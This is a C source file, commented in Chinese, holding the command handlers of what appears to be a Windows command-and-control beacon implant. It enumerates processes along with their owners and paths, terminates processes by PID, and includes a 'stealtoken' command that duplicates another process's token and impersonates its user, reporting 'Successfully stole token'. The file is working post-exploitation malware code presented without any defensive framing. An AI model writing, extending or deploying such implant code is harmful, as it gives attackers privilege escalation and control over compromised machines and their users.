#include "beacon_commands.h"

#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

/* 将字符串以长度前缀字节形式打包到输出缓冲区 */
static VOID PsPackStringBytes(ByteBuf* out, const CHAR* value)
{
    BbBytes(out, value, value ? strlen(value) : 0);
}

/* 通过 PID 获取进程的完整镜像路径 */
static CHAR* PsProcessPath(DWORD pid)
{
    HANDLE proc;
    WCHAR path[32768];
    DWORD size = ARRAYSIZE(path);
    CHAR* utf8;

    /* 以受限查询权限打开进程 */
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) {
        return HeapStrDupA("");
    }

    /* 查询完整的进程镜像名称 */
    if (!QueryFullProcessImageNameW(proc, 0, path, &size)) {
        CloseHandle(proc);
        return HeapStrDupA("");
    }

    CloseHandle(proc);
    utf8 = WideToUtf8(path);
    return utf8 ? utf8 : HeapStrDupA("");
}

/* 通过 PID 获取进程的所有者（用户） */
static CHAR* PsGetOwner(DWORD pid)
{
    HANDLE proc;
    HANDLE token = NULL;
    DWORD needed = 0;
    BYTE8* buffer = NULL;
    TOKEN_USER* token_user;
    WCHAR name[256];
    WCHAR domain[256];
    DWORD name_len = ARRAYSIZE(name);
    DWORD domain_len = ARRAYSIZE(domain);
    SID_NAME_USE sid_use;
    CHAR* user_utf8 = NULL;

    /* 打开进程及其访问令牌 */
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) {
        return HeapStrDupA("");
    }

    if (!OpenProcessToken(proc, TOKEN_QUERY, &token)) {
        CloseHandle(proc);
        return HeapStrDupA("");
    }

    /* 查询用户 SID 的令牌信息 */
    GetTokenInformation(token, TokenUser, NULL, 0, &needed);
    if (needed == 0) {
        CloseHandle(token);
        CloseHandle(proc);
        return HeapStrDupA("");
    }

    buffer = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, needed);
    if (!buffer || !GetTokenInformation(token, TokenUser, buffer, needed, &needed)) {
        HeapFree(GetProcessHeap(), 0, buffer);
        CloseHandle(token);
        CloseHandle(proc);
        return HeapStrDupA("");
    }

    /* 将 SID 解析为 域\用户名 */
    token_user = (TOKEN_USER*)buffer;
    if (LookupAccountSidW(NULL,
                          token_user->User.Sid,
                          name,
                          &name_len,
                          domain,
                          &domain_len,
                          &sid_use)) {
        WCHAR full[600];
        if (domain[0]) {
            swprintf_s(full, ARRAYSIZE(full), L"%s\\%s", domain, name);
        } else {
            swprintf_s(full, ARRAYSIZE(full), L"%s", name);
        }
        user_utf8 = WideToUtf8(full);
    }

    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(token);
    CloseHandle(proc);
    return user_utf8 ? user_utf8 : HeapStrDupA("");
}

/* 判断进程架构（0 = x86/WOW64，1 = x64/原生） */
static INT32 PsGetIntegrity(DWORD pid)
{
    SYSTEM_INFO native_info;
    HANDLE proc;
    BOOL is_wow64 = FALSE;

    /* 检查系统是否仅为 32 位 */
    ZeroMemory(&native_info, sizeof(native_info));
    GetNativeSystemInfo(&native_info);
    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        return 0;
    }

    /* 检查进程是否在 WOW64 下运行 */
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) {
        return 1;
    }

    if (!IsWow64Process(proc, &is_wow64)) {
        CloseHandle(proc);
        return 1;
    }

    CloseHandle(proc);
    return is_wow64 ? 0 : 1;
}

/* 枚举所有运行中的进程并返回其详细信息 */
ByteBuf CommandPs(VOID)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    ByteBuf out;
    UINT32 count = 0;

    BbInit(&out);

    /* 预留进程计数空间（稍后修补） */
    PacketArrayI32(&out, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;

    /* 遍历快照中的所有进程 */
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            CHAR* name = WideToUtf8(pe.szExeFile);
            CHAR* path = PsProcessPath(pe.th32ProcessID);
            CHAR* user = PsGetOwner(pe.th32ProcessID);
            DWORD session_id = 0;

            /* 将进程信息打包到输出缓冲区 */
            ProcessIdToSessionId(pe.th32ProcessID, &session_id);
            PacketArrayI32(&out, (INT32)pe.th32ProcessID);
            PacketArrayI32(&out, (INT32)pe.th32ParentProcessID);
            PsPackStringBytes(&out, name ? name : "");
            PsPackStringBytes(&out, path ? path : "");
            PsPackStringBytes(&out, user ? user : "");
            PacketArrayI32(&out, PsGetIntegrity(pe.th32ProcessID));
            PacketArrayI32(&out, (INT32)session_id);
            ++count;

            HeapFree(GetProcessHeap(), 0, name);
            HeapFree(GetProcessHeap(), 0, path);
            HeapFree(GetProcessHeap(), 0, user);
        } while (Process32NextW(snap, &pe));
    }

    /* 完成：将进程计数修补到起始位置 */
    CloseHandle(snap);
    PacketPatchU32(&out, count);
    return out;
}

/* 通过 PID 终止进程。
 * wire：[count][pid]；count=0 与截断包在此显式区分，不再让 pid 静默落到 0。 */
ByteBuf CommandKill(Parser* p)
{
    UINT32 count;
    DWORD pid;
    HANDLE proc;

    /* 验证参数 */
    count = ParserU32(p);
    if (p->error[0] || count == 0) return BbFromText("kill requires 1 argument");

    pid = ParserU32(p);
    if (p->error[0]) return BbFromText(p->error);

    /* 打开并终止进程 */
    proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!proc) return BbFromText("OpenProcess failed");
    TerminateProcess(proc, 0);
    CloseHandle(proc);
    return BbFromText("Process terminated");
}

/* 窃取并模拟目标进程的令牌。wire 同 kill：[count][pid]，缺参/截断显式报错。 */
ByteBuf CommandStealToken(Parser* p)
{
    UINT32 count;
    DWORD pid;
    HANDLE proc;
    HANDLE token = NULL;
    HANDLE dup = NULL;

    /* 验证参数 */
    count = ParserU32(p);
    if (p->error[0] || count == 0) return BbFromText("stealtoken requires 1 argument");

    pid = ParserU32(p);
    if (p->error[0]) return BbFromText(p->error);

    /* 打开进程并复制其令牌 */
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) return BbFromText("OpenProcess failed");

    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
        CloseHandle(proc);
        return BbFromText("OpenProcessToken failed");
    }

    /* 复制令牌并模拟登录用户 */
    if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dup) ||
        !ImpersonateLoggedOnUser(dup)) {
        CloseHandle(proc);
        CloseHandle(token);
        if (dup) CloseHandle(dup);
        return BbFromText("DuplicateTokenEx/ImpersonateLoggedOnUser failed");
    }

    CloseHandle(proc);
    CloseHandle(token);
    CloseHandle(dup);
    return BbFromText("Successfully stole token");
}

/* 返回当前用户名和管理员状态 */
ByteBuf CommandWhoami(const BeaconContext* ctx)
{
    ByteBuf out;
    BbInit(&out);
    BbPrintf(&out, "%s %s", ctx->meta.username, ctx->meta.is_admin ? "(Admin)" : "(User)");
    return out;
}
